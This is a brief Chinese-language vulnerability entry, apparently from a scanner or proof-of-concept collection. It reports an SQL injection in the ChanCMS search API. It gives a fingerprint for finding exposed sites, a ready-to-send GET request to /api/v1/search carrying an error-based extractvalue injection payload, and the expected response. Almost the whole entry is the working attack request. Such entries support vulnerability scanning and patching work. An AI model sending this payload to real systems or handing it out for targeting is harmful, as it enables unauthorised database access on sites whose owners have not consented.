# ChanCms-search存在SQL注入漏洞

ChanCms ｜ SQL注入 ｜ —
- **指纹**：`body="ChanCMS"`
- **请求**：`GET /api/v1/search?key=%27%20and%20extractvalue(1,concat(0x7e,%27e6b16a5b2de3b9e2f3913d66e6bdcbd1%27,0x7e))--%20a HTTP/1.1`
- **响应特征**：200